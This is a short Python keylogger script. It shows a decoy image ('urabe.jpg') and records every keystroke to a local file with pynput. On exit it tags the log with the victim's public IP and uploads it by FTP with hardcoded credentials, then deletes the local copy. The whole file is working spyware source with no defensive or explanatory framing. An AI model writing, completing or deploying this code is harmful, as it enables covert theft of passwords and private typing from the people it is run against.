from pynput import keyboard
#from pynput.keyboard import Listener
from PIL import Image
import signal
import sys
import time
import ftplib
import os
import requests

def ftpUpload():
    HOSTNAME = "localhost"
    USERNAME = "Frankom"
    PASSWORD = "123"
    IPAddr = requests.get("https://api.ipify.org/?format=json").json()['ip']
    filename = 'file'+'-'+IPAddr
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
    with open('file', 'rb') as f:
        ftp_server.storbinary(f"STOR {filename}", f)

def on_press(key):
    with open('file', 'a') as f:
        f.write(str(key)+' ')

Image.open('urabe.jpg').show()

#with Listener(on_press=on_press) as listener:
#    listener.join()
listener = keyboard.Listener(on_press=on_press)
listener.start()

running = True  

def handle_exit(signum, frame):
    global running
    print(f"\nReceived signal {signum}, exiting gracefully...")
    ftpUpload()
    os.remove('file')
    running = False  
    listener.stop()  
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)   # Ctrl+C
signal.signal(signal.SIGTERM, handle_exit)  # kill <pid>

while running:
    try:
        time.sleep(0.1) 
    except KeyboardInterrupt:
        handle_exit(signal.SIGINT, None)